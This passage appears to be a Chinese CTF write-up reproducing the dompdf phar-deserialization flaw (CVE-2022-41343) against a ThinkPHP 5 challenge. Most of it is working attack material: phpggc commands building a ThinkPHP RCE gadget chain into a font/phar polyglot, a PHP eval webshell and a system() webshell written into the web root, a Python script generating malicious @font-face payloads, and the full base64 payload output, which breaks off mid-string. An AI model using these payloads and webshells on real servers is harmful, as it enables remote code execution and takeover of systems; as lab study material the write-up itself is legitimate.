class="variable">$headers</span> = <span class="literal">null</span>;</span><br><span class="line">        [<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$uri</span>);</span><br><span class="line">        <span class="variable">$is_local_path</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$protocol</span>), [<span class="string">&quot;&quot;</span>, <span class="string">&quot;file://&quot;</span>, <span class="string">&quot;phar://&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$can_use_curl</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$protocol</span>), [<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span>], <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">set_error_handler</span>([<span class="built_in">self</span>::<span class="variable language_">class</span>, <span class="string">&#x27;record_warnings&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$is_local_path</span> || <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>) || !<span class="variable">$can_use_curl</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$is_local_path</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$uri</span> = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">encodeURI</span>(<span class="variable">$uri</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$maxlen</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uri</span>, <span class="literal">false</span>, <span class="variable">$context</span>, <span class="variable">$offset</span>, <span class="variable">$maxlen</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uri</span>, <span class="literal">false</span>, <span class="variable">$context</span>, <span class="variable">$offset</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$content</span> = <span class="variable">$result</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$http_response_header</span>)) &#123;</span><br><span class="line">                    <span class="variable">$headers</span> = <span class="variable">$http_response_header</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$can_use_curl</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;curl_exec&#x27;</span>)) &#123;</span><br><span class="line">         [...]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$content</span>, <span class="variable">$headers</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426112016718.png" alt="image-20230426112016718"></p><p>这里就是触发phar反序列化的关键了</p><p>可以看到<code>file_get_contents</code>，之后就不赘述了，接下来解释一下复现步骤，由于题目是基于TP5的，那么肯定是可以打TP5的反序列化利用链。<br>首先我们要生成恶意字体文件，用以下脚本去生成：</p><p>脚本是上面的分析文章里写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> fontforge</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sys.stdout.buffer.write(do_generate_font())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_generate_font</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    fd, fn = tempfile.mkstemp(suffix=<span class="string">&quot;.ttf&quot;</span>)</span><br><span class="line">    os.close(fd)</span><br><span class="line">    font = fontforge.font()</span><br><span class="line">    font.copyright = <span class="string">&quot;DUMMY FONT&quot;</span></span><br><span class="line">    font.generate(fn)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fn, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        res = f.read()</span><br><span class="line">    os.unlink(fn)</span><br><span class="line">    result = res</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>大概率会报错font模块没找到<code>apt-get install python3-fontforge</code>安装一下<br>之后可以生成可以font：</p><p><img src="../images/image-20230426114443537.png" alt="image-20230426114443537"></p><p>就是把python脚本生成的内容给到<code>font.ttf</code>里面</p><p><strong>然后就开始使用phpggc来生成payload</strong></p><p>PHPGGC是一款能够自动生成主流框架的序列化测试payload的工具,可以说是反序列化的武器库,平时遇到有关反序列化的题目时如果能够熟练运用它，将节省大量功夫</p><p><code>./phpggc -l</code>    查看可利用的反序列化链</p><p><img src="../images/image-20230426195919698.png" alt="image-20230426195919698"></p><p>这里根据题目的thinkphp版本来进行选</p><p><code>./phpggc ThinkPHP/FW1 &lt;remote_path&gt; &lt;local_path&gt;</code><br>用法如上，remote_path是要写入靶场的位置，local_path是你shell文件的位置。<br>需要注意的是。tp5的话写入public文件夹下。因为只有public文件夹下我们可以访问<br>这里我准备的shell如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426200140792.png" alt="image-20230426200140792"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d phar.<span class="keyword">readonly</span>=<span class="number">0</span> phpggc ThinkPHP/RCE2 system <span class="string">&quot;echo &#x27;&lt;?php system(<span class="subst">$_GET</span>[0]); ?&gt;&#x27; &gt; /var/www/html/public/mochu7.php&quot;</span> -p phar -pp font.ttf -o font-polyglot.phar</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426201055420.png" alt="image-20230426201055420"></p><p><strong>然后用下面的脚本生成payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">PAYLOAD_TEMPLATE_URL_ENCODED = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;%s&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">    @font-face &#123;</span></span><br><span class="line"><span class="string">        font-family:&#x27;exploit&#x27;;</span></span><br><span class="line"><span class="string">        src:url(&#x27;%s&#x27;);</span></span><br><span class="line"><span class="string">        font-weight:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">        font-style:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_args</span>():</span><br><span class="line">    parser = argparse.ArgumentParser( prog=<span class="string">&quot;generate_payload.py&quot;</span>,</span><br><span class="line">                      formatter_class=<span class="keyword">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position=<span class="number">50</span>),</span><br><span class="line">                      epilog= <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                       This script will generate payloads for CVE-2022-41343</span></span><br><span class="line"><span class="string">                      &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Polyglot File&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--path&quot;</span>, default=<span class="string">&quot;/var/www/&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Base path to vendor directory (Default = /var/www/)&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args = get_args()</span><br><span class="line">    file = args.file.strip()</span><br><span class="line">    path = args.path.strip()</span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(file)):</span><br><span class="line">        generate_payloads(file, path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: File doesn&#x27;t exist.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payloads</span>(<span class="params">file, path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        fc = f.read()</span><br><span class="line">    b64 = base64.b64encode(fc)</span><br><span class="line">    data_uri_pure = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % b64.decode()</span><br><span class="line">    data_uri_double_encoded = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % urllib.parse.quote_plus(urllib.parse.quote_plus(b64.decode()))</span><br><span class="line">    md5 = hashlib.md5(urllib.parse.unquote(data_uri_double_encoded).encode()).hexdigest()</span><br><span class="line">    <span class="comment"># 计算md5这里，因为大佬这里是两次url编码，但是上传之后服务器接收会解一次url，dompdf真正处理的数据应该是经过一次url解码的数据，所以计算md5需要解一次url编码才是正确的文件名</span></span><br><span class="line">    phar_uri = <span class="string">&quot;phar://%s/vendor/dompdf/dompdf/lib/fonts/exploit_normal_%s.ttf##&quot;</span> % (path,md5)</span><br><span class="line">    req1_enc = PAYLOAD_TEMPLATE_URL_ENCODED % data_uri_double_encoded</span><br><span class="line">    req2_enc = PAYLOAD_TEMPLATE_URL_ENCODED % urllib.parse.quote_plus(phar_uri)</span><br><span class="line">    req1_pure = PAYLOAD_TEMPLATE % data_uri_double_encoded</span><br><span class="line">    req2_pure = PAYLOAD_TEMPLATE % phar_uri</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_pure)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_pure)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="number">1.</span>py -p <span class="string">&quot;/var/www/html&quot;</span> font-polyglot.phar</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426201328406.png" alt="image-20230426201328406"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">====== REQUEST 1 ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 2 ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_da94a27b825aeca64e86b19a3972972d.ttf%23%23&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 1 NOT ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    @font-face &#123;</span><br><span class="line">        font-family:&#x27;exploit&#x27;;</span><br><span class="line">        src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOj